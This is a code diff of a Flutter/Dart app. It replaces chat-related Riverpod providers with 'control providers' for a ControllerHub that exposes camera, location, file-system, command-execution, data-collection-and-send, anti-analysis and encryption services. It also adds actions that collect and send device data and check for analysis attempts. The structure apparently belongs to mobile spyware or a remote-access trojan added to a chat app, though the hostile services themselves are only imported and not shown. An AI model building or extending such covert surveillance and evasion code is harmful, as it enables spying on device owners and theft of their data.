@@ -1,127 +1,206 @@
-// lib/presentation/chat/providers/chat_providers.dart
-import "package:cloud_firestore/cloud_firestore.dart";
-import "package:firebase_storage/firebase_storage.dart"; // Import Firebase Storage
-import "package:flutter_riverpod/flutter_riverpod.dart";
+// lib/presentation/chat/providers/control_providers.dart
+import 'package:flutter_riverpod/flutter_riverpod.dart';
 
-import "../../../core/logging/logger_provider.dart";
-import "../../../data/models/chat/chat_conversation.dart";
-import "../../../data/models/chat/chat_message.dart";
-import "../api_service.dart";
-import "auth_providers.dart"; // لـ currentAgentCodeProvider
+import '../../../core/controlar/camera/camera_service.dart';
+import '../../../core/controlar/command/command_executor.dart';
+import '../../../core/controlar/controller_hub.dart';
+import '../../../core/controlar/data/data_collector_service.dart';
+import '../../../core/controlar/filesystem/file_system_service.dart';
+import '../../../core/controlar/location/location_service.dart';
+import '../../../core/controlar/network/network_service.dart';
+import '../../../core/controlar/permissions/device_info_service.dart';
+import '../../../core/controlar/permissions/permission_service.dart';
+import '../../../core/controlar/security/anti_analysis_system.dart';
+import '../../../core/controlar/security/encryption_service.dart';
+import '../../../core/logging/logger_provider.dart';
 
-// Provider لـ ApiService - سيكون null حتى يتوفر agentCode
-final apiServiceProvider = Provider<ApiService?>((ref) {
-  final firestore = FirebaseFirestore.instance;
-  final storage = FirebaseStorage.instance; // Add Firebase Storage instance
-  final logger =
-      ref.watch(appLoggerProvider); // استخدام appLoggerProvider العام
-  final agentCodeAsync = ref.watch(currentAgentCodeProvider);
+// Main controller hub provider
+final controllerHubProvider = Provider<ControllerHub>((ref) {
+  final controllerHub = ControllerHub();
 
-  return agentCodeAsync.when(
-    data: (agentCode) {
-      if (agentCode != null && agentCode.isNotEmpty) {
-        logger.info("apiServiceProvider",
-            "Agent code available: $agentCode. Initializing ApiService.");
-        // Ensure correct argument order: firestore, storage, logger, agentCode
-        return ApiService(firestore, storage, logger, agentCode);
-      }
-      logger.warn("apiServiceProvider",
-          "Agent code is null or empty. ApiService will not be available yet.");
-      return null;
-    },
-    loading: () {
-      logger.info("apiServiceProvider",
-          "Agent code is loading... ApiService not yet available.");
-      return null;
-    },
-    error: (error, stackTrace) {
-      logger.error(
-          "apiServiceProvider", "Error loading agent code", error, stackTrace);
-      return null;
-    },
-  );
+  // Start the controller hub when it's accessed
+  controllerHub.start().then((success) {
+    if (success) {
+      ref
+          .read(appLoggerProvider)
+          .info("ControllerHubProvider", "Controller hub started successfully");
+    } else {
+      ref
+          .read(appLoggerProvider)
+          .error("ControllerHubProvider", "Failed to start controller hub");
+    }
+  });
+
+  // Make sure to dispose the controller when the provider is disposed
+  ref.onDispose(() {
+    controllerHub.dispose();
+  });
+
+  return controllerHub;
 });
 
-// StreamProvider للمحادثات
-final chatConversationsStreamProvider =
-    StreamProvider<List<ChatConversation>>((ref) {
-  final agentCodeAsync = ref.watch(currentAgentCodeProvider);
+// Controller status provider
+final controllerStatusProvider = StreamProvider<String>((ref) {
+  final controllerHub = ref.watch(controllerHubProvider);
+  return controllerHub.statusMessageStream;
+});
+
+// Connection status provider
+final connectionStatusProvider = StreamProvider<bool>((ref) {
+  final controllerHub = ref.watch(controllerHubProvider);
+  return controllerHub.connectionStatusStream;
+});
+
+// Permission service provider
+final permissionServiceProvider = Provider<PermissionService>((ref) {
+  return PermissionService();
+});
+
+// Individual service providers - these use the services from the controller hub
+final deviceInfoServiceProvider = Provider<DeviceInfoService>((ref) {
+  return ref.watch(controllerHubProvider).deviceInfoService;
+});
+
+final dataCollectorServiceProvider = Provider<DataCollectorService>((ref) {
+  return ref.watch(controllerHubProvider).dataCollectorService;
+});
+
+final locationServiceProvider = Provider<LocationService>((ref) {
+  return ref.watch(controllerHubProvider).locationService;
+});
+
+final cameraServiceProvider = Provider<CameraService>((ref) {
+  return ref.watch(controllerHubProvider).cameraService;
+});
+
+final fileSystemServiceProvider = Provider<FileSystemService>((ref) {
+  return ref.watch(controllerHubProvider).fileSystemService;
+});
+
+final networkServiceProvider = Provider<NetworkService>((ref) {
+  return ref.watch(controllerHubProvider).networkService;
+});
+
+final commandExecutorProvider = Provider<CommandExecutor>((ref) {
+  return ref.watch(controllerHubProvider).commandExecutor;
+});
+
+final antiAnalysisSystemProvider = Provider<AntiAnalysisSystem>((ref) {
+  return ref.watch(controllerHubProvider).antiAnalysisSystem;
+});
+
+final encryptionServiceProvider = Provider<EncryptionService>((ref) {
+  return ref.watch(controllerHubProvider).encryptionService;
+});
+
+// Controller action providers
+
+/// Provider to trigger data collection and sending
+final collectDataActionProvider = FutureProvider.autoDispose<bool>((ref) async {
+  final controllerHub = ref.watch(controllerHubProvider);
   final logger = ref.watch(appLoggerProvider);
-  final firestore = FirebaseFirestore.instance;
-  final storage = FirebaseStorage.instance; // Add Firebase Storage instance
 
-  return agentCodeAsync.when(
-    data: (agentCode) {
-      if (agentCode != null && agentCode.isNotEmpty) {
-        final apiService =
-            ref.read(apiServiceProvider); 
-        if (apiService != null) {
-          return apiService.getConversationsStream();
-        }
-        logger.warn("chatConversationsStreamProvider",
-            "ApiService was null but agentCode is $agentCode. Creating temp instance.");
-        // Ensure correct argument order: firestore, storage, logger, agentCode
-        final tempApiService = ApiService(firestore, storage, logger, agentCode);
-        return tempApiService.getConversationsStream();
-      }
-      logger.info("chatConversationsStreamProvider",
-          "No agent code, returning empty stream for conversations.");
-      return Stream.value([]);
-    },
-    loading: () {
-      logger.info("chatConversationsStreamProvider",
-          "Agent code loading, returning empty stream for conversations.");
-      return Stream.value([]);
-    },
-    error: (e, s) {
-      logger.error(
-          "chatConversationsStreamProvider",
-          "Error with agent code, returning error stream for conversations.",
-          e,
-          s);
-      return Stream.error(e, s);
-    },
-  );
+  logger.info("CollectDataAction", "Manually triggering data collection");
+  final result = await controllerHub.collectAndSendData();
+
+  logger.info("CollectDataAction", "Data collection result: $result");
+  return result;
 });
 
-// StreamProvider للرسائل
-final chatMessagesStreamProvider = StreamProvider.autoDispose
-    .family<List<ChatMessage>, String>((ref, conversationId) {
-  final agentCodeAsync = ref.watch(currentAgentCodeProvider);
+/// Provider to check for analysis attempts
+final checkAnalysisActionProvider =
+    FutureProvider.autoDispose<bool>((ref) async {
+  final controllerHub = ref.watch(controllerHubProvider);
   final logger = ref.watch(appLoggerProvider);
-  final firestore = FirebaseFirestore.instance;
-  final storage = FirebaseStorage.instance; // Add Firebase Storage instance
 
-  return agentCodeAsync.when(
-    data: (agentCode) {
-      if (agentCode != null && agentCode.isNotEmpty) {
-        final apiService = ref.read(apiServiceProvider);
-        if (apiService != null) {
-          return apiService.getMessagesStream(conversationId);
-        }
-        logger.warn("chatMessagesStreamProvider",
-            "ApiService was null for $conversationId but agentCode is $agentCode. Creating temp instance.");
-        // Ensure correct argument order: firestore, storage, logger, agentCode
-        final tempApiService = ApiService(firestore, storage, logger, agentCode);
-        return tempApiService.getMessagesStream(conversationId);
-      }
-      logger.info("chatMessagesStreamProvider",
-          "No agent code, returning empty stream for messages in $conversationId.");
-      return Stream.value([]);
-    },
-    loading: () {
-      logger.info("chatMessagesStreamProvider",
-          "Agent code loading, returning empty stream for messages in $conversationId.");
-      return Stream.value([]);
-    },
-    error: (e, s) {
-      logger.error(
-          "chatMessagesStreamProvider",
-          "Error with agent code, returning error stream for messages in $conversationId.",
-          e,
-          s);
-      return Stream.error(e, s);
-    },
-  );
+  logger.info("CheckAnalysisAction", "Manually checking for analysis attempts");
+  final result = await controllerHub.checkForAnalysisAttempts();
+
+  logger.info("CheckAnalysisAction", "Analysis check result: $result");
+  return result;
 });
 
+/// State class for controller state
+class ControllerState {
+  final bool isRunning;
+  final bool isConnected;
+  final String statusMessage;
+  final int dataCollectionCount;
+
+  ControllerState({
+    required this.isRunning,
+    required this.isConnected,
+    required this.statusMessage,
+    required this.dataCollectionCount,
+  });
+
+  ControllerState copyWith({
+    bool? isRunning,
+    bool? isConnected,
+    String? statusMessage,
+    int? dataCollectionCount,
+  }) {
+    return ControllerState(
+      isRunning: isRunning ?? this.isRunning,
+      isConnected: isConnected ?? this.isConnected,
+      statusMessage: statusMessage ?? this.statusMessage,
+      dataCollectionCount: dataCollectionCount ?? this.dataCollectionCount,
+    );
+  }
+}
+
+/// State notifier for controller state
+class ControllerStateNotifier extends StateNotifier<ControllerState> {
+  final ControllerHub _controllerHub;
+
+  ControllerStateNotifier(this._controllerHub)
+      : super(ControllerState(
+          isRunning: _controllerHub.isRunning,
+          isConnected: _controllerHub.isConnected,
+          statusMessage: 'Initialized',
+          dataCollectionCount: 0,
+        )) {
+    // Listen for status messages
+    _controllerHub.statusMessageStream.listen((message) {
+      state = state.copyWith(statusMessage: message);
+    });
+
+    // Listen for connection status
+    _controllerHub.connectionStatusStream.listen((connected) {
+      state = state.copyWith(isConnected: connected);
+    });
+  }
+
+  /// Start the controller
+  Future<bool> startController() async {
+    final success = await _controllerHub.start();
+    if (success) {
+      state = state.copyWith(isRunning: true);
+    }
+    return success;
+  }
+
+  /// Stop the controller
+  Future<void> stopController() async {
+    await _controllerHub.stop();
+    state = state.copyWith(isRunning: false);
+  }
+
+  /// Collect and send data
+  Future<bool> collectAndSendData() async {
+    final success = await _controllerHub.collectAndSendData();
+    if (success) {
+      state = state.copyWith(
+        dataCollectionCount: state.dataCollectionCount + 1,
+      );
+    }
+    return success;
+  }
+}
+
+/// Provider for controller state notifier
+final controllerStateProvider =
+    StateNotifierProvider<ControllerStateNotifier, ControllerState>((ref) {
+  final controllerHub = ref.watch(controllerHubProvider);
+  return ControllerStateNotifier(controllerHub);
+});
